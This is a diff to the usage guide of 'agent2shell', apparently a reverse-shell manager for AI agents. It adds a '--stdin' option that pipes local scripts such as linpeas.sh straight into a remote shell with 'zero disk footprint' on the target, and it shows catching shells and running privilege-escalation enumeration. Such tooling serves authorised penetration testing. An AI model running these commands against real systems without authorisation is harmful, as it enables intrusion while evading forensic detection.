@@ -52,6 +52,25 @@ agent2shell run ls -la /root    # works — -la is part of the remote command
 agent2shell run -t 10 whoami    # -t is agent2shell's timeout flag
 ```
 
+### Pipe a local script via stdin
+
+```bash
+agent2shell run --stdin <local-file> [interpreter]
+```
+
+Pipes a local file's content as stdin to the remote shell without writing to disk on the target. When no interpreter is specified, defaults to `bash`. Works with any interpreter available on the target:
+
+```bash
+agent2shell run --stdin ./linpeas.sh                      # pipe to bash (default)
+agent2shell run -t 300 --stdin ./linpeas.sh               # with timeout for long scripts
+agent2shell run --stdin ./recon.py python3                 # pipe to python
+agent2shell run --stdin ./dump.php php                     # pipe to PHP
+agent2shell run --stdin ./enum.pl perl                     # pipe to Perl
+echo 'SELECT user();' | agent2shell run --stdin - mysql    # pipe from OS stdin
+```
+
+Use `--stdin` instead of `push` when you want zero disk footprint on the target — the script runs entirely through the shell's stdin.
+
 ### Get session metadata
 
 ```bash
@@ -124,7 +143,13 @@ agent2shell catch -p 5555 --tag database
 
 ## Workflow Patterns
 
-### Tool Upload and Execution
+### Tool Execution via stdin (no disk footprint)
+
+```bash
+agent2shell run -t 300 --stdin ./linpeas.sh
+```
+
+### Tool Upload and Execution (writes to disk)
 
 ```bash
 agent2shell push ./linpeas.sh /tmp/linpeas.sh
@@ -198,9 +223,8 @@ agent2shell list
 Output is streamed line-by-line by default. Use `-t` (seconds) to increase the timeout beyond the default 30s:
 
 ```bash
-agent2shell push ./linpeas.sh /tmp/linpeas.sh
-agent2shell run "chmod +x /tmp/linpeas.sh"
-agent2shell run -t 300 "/tmp/linpeas.sh"
+agent2shell run -t 300 --stdin ./linpeas.sh               # via stdin (no disk)
+agent2shell run -t 300 "/tmp/linpeas.sh"                   # via push (on disk)
 ```
 
 For network scanning, wrap each connection with `timeout` to avoid hanging on unresponsive hosts:
